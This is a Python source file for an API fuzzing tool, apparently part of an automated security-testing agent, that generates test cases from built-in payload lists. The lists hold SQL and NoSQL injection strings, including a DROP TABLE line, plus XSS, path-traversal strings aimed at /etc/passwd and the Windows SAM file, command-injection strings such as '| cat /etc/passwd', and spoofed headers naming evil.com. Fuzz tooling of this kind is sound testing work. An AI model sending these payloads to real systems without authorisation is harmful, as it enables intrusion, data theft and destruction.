"""API Fuzzer tool for testing API endpoints."""

from __future__ import annotations

import random
import string
from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


APIFuzzAction = Literal["generate_payloads", "fuzz_params", "fuzz_headers", "fuzz_methods"]


# Fuzzing payloads by category
FUZZ_PAYLOADS = {
    "sql_injection": [
        "'", "''", '"', "1' OR '1'='1", "1' OR '1'='1' --", "' OR ''='",
        "admin'--", "1; DROP TABLE users--", "' UNION SELECT NULL--",
        "1' AND '1'='1", "1' AND '1'='2", "1' WAITFOR DELAY '0:0:5'--",
    ],
    "nosql_injection": [
        '{"$gt": ""}', '{"$ne": ""}', '{"$regex": ".*"}',
        '{"$where": "1==1"}', "[$ne]=", "[$gt]=", "[$regex]=.*",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(1)", "<svg onload=alert(1)>",
        "'><script>alert(1)</script>", '"><img src=x onerror=alert(1)>',
        "<body onload=alert(1)>", "'-alert(1)-'",
    ],
    "path_traversal": [
        "../", "..\\", "....//", "....\\\\",
        "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f", "%252e%252e%252f", "..%00/",
    ],
    "command_injection": [
        "; ls", "| cat /etc/passwd", "& dir", "`id`",
        "$(whoami)", "; sleep 5", "| sleep 5", "& ping -c 5 127.0.0.1",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{{config}}", "${class.getClass()}", "{{self.__class__}}",
    ],
    "type_juggling": [
        "0", "null", "undefined", "NaN", "[]", "{}",
        "true", "false", "-1", "9999999999", "",
    ],
    "special_chars": [
        "\x00", "\n", "\r", "\t", "%00", "%0a", "%0d",
        "\\", "/", ":", "*", "?", "<", ">", "|",
    ],
    "boundary": [
        "", " ", "   ", "\n", "\r\n",
        "a" * 1000, "a" * 10000, "-1", "0", "999999999",
    ],
}

# HTTP methods to test
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]

# Headers to fuzz
FUZZ_HEADERS = {
    "Host": ["localhost", "127.0.0.1", "evil.com", "[::1]", "localhost:8080"],
    "X-Forwarded-For": ["127.0.0.1", "localhost", "10.0.0.1", "192.168.1.1"],
    "X-Forwarded-Host": ["localhost", "evil.com", "internal.local"],
    "X-Original-URL": ["/admin", "/api/admin", "/../admin"],
    "X-Rewrite-URL": ["/admin", "/api/private"],
    "X-Custom-IP-Authorization": ["127.0.0.1", "localhost"],
    "User-Agent": ["' OR '1'='1", "<script>alert(1)</script>", "sqlmap/1.0"],
    "Referer": ["https://evil.com", "javascript:alert(1)"],
    "Content-Type": [
        "application/json", "application/xml", "text/plain",
        "application/x-www-form-urlencoded", "multipart/form-data",
    ],
}


def _generate_random_string(length: int = 10) -> str:
    """Generate a random alphanumeric string."""
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def _generate_payloads(categories: list[str] | None = None) -> dict[str, Any]:
    """Generate fuzzing payloads for specified categories."""
    if categories is None:
        categories = list(FUZZ_PAYLOADS.keys())

    payloads: dict[str, list[str]] = {}
    for category in categories:
        if category in FUZZ_PAYLOADS:
            payloads[category] = FUZZ_PAYLOADS[category]

    return {
        "payloads": payloads,
        "total_payloads": sum(len(p) for p in payloads.values()),
        "categories": list(payloads.keys()),
    }


def _fuzz_parameters(
    params: dict[str, str],
    categories: list[str] | None = None,
) -> list[dict[str, Any]]:
    """Generate fuzzed parameter combinations."""
    if categories is None:
        categories = ["sql_injection", "xss", "path_traversal"]

    fuzz_cases: list[dict[str, Any]] = []

    for param_name, original_value in params.items():
        for category in categories:
            if category not in FUZZ_PAYLOADS:
                continue

            for payload in FUZZ_PAYLOADS[category]:
                fuzzed_params = dict(params)
                fuzzed_params[param_name] = payload

                fuzz_cases.append({
                    "parameter": param_name,
                    "original_value": original_value,
                    "payload": payload,
                    "category": category,
                    "fuzzed_params": fuzzed_params,
                })

    return fuzz_cases


def _fuzz_header_combinations() -> list[dict[str, str]]:
    """Generate header fuzzing combinations."""
    combinations: list[dict[str, str]] = []

    for header, values in FUZZ_HEADERS.items():
        for value in values:
            combinations.append({
                "header": header,
                "value": value,
                "description": f"Test {header} header injection",
            })

    return combinations


def _fuzz_methods(endpoint: str) -> list[dict[str, str]]:
    """Generate method fuzzing test cases."""
    return [
        {
            "method": method,
            "endpoint": endpoint,
            "description": f"Test {method} method on endpoint",
        }
        for method in HTTP_METHODS
    ]


@register_tool
def api_fuzzer(
    action: APIFuzzAction,
    params: dict[str, str] | None = None,
    endpoint: str | None = None,
    categories: list[str] | None = None,

    **kwargs: Any,  # Capture unknown parameters
) -> dict[str, Any]:
    """Generate fuzzing payloads and test cases for API security testing.

    This tool helps generate various fuzzing payloads for testing APIs
    including SQL injection, XSS, path traversal, and more.

    Args:
        action: The fuzzing action to perform:
            - generate_payloads: Generate fuzzing payloads by category
            - fuzz_params: Generate fuzzed parameter combinations
            - fuzz_headers: Generate header injection test cases
            - fuzz_methods: Generate HTTP method test cases
        params: Parameters to fuzz (dict of param name to value)
        endpoint: API endpoint URL for method fuzzing
        categories: Payload categories to include

    Returns:
        Fuzzing payloads and test cases for security testing
    """
    # Define valid parameters and actions
    VALID_PARAMS = {"action", "params", "endpoint", "categories"}
    VALID_ACTIONS = ["generate_payloads", "fuzz_params", "fuzz_headers", "fuzz_methods"]

    # Check for unknown parameters
    unknown_error = validate_unknown_params(kwargs, VALID_PARAMS, "api_fuzzer")
    if unknown_error:
        unknown_error.update(
            generate_usage_hint(
                "api_fuzzer",
                "generate_payloads",
                {"categories": ["sql_injection", "xss"]},
            )
        )
        return unknown_error

    # Validate action parameter
    action_error = validate_action_param(action, VALID_ACTIONS, "api_fuzzer")
    if action_error:
        action_error["usage_examples"] = {
            "generate_payloads": "api_fuzzer(action='generate_payloads', categories=['sql_injection'])",
            "fuzz_params": "api_fuzzer(action='fuzz_params', params={'id': '1', 'name': 'test'})",
            "fuzz_headers": "api_fuzzer(action='fuzz_headers')",
            "fuzz_methods": "api_fuzzer(action='fuzz_methods', endpoint='https://api.example.com/users')",
        }
        return action_error

    # Validate required parameters based on action
    if action == "fuzz_params":
        params_error = validate_required_param(params, "params", action, "api_fuzzer")
        if params_error:
            params_error.update(
                generate_usage_hint(
                    "api_fuzzer",
                    action,
                    {"params": {"id": "1", "name": "test"}},
                )
            )
            return params_error

    if action == "fuzz_methods":
        endpoint_error = validate_required_param(endpoint, "endpoint", action, "api_fuzzer")
        if endpoint_error:
            endpoint_error.update(
                generate_usage_hint(
                    "api_fuzzer",
                    action,
                    {"endpoint": "https://api.example.com/users"},
                )
            )
            return endpoint_error

    try:
        if action == "generate_payloads":
            return _generate_payloads(categories)

        if action == "fuzz_params":
            if not params:
                return {"error": "params parameter required for this action"}

            fuzz_cases = _fuzz_parameters(params, categories)

            return {
                "total_cases": len(fuzz_cases),
                "cases": fuzz_cases,
                "original_params": params,
                "categories_tested": categories or ["sql_injection", "xss", "path_traversal"],
            }

        if action == "fuzz_headers":
            combinations = _fuzz_header_combinations()

            return {
                "total_cases": len(combinations),
                "cases": combinations,
                "headers_tested": list(FUZZ_HEADERS.keys()),
            }

        if action == "fuzz_methods":
            if not endpoint:
                return {"error": "endpoint parameter required for this action"}

            method_cases = _fuzz_methods(endpoint)

            return {
                "total_cases": len(method_cases),
                "cases": method_cases,
                "endpoint": endpoint,
                "methods_tested": HTTP_METHODS,
            }

        return {"error": f"Unknown action: {action}"}

    except (KeyError, ValueError) as e:
        return {"error": f"API fuzzing failed: {e!s}"}
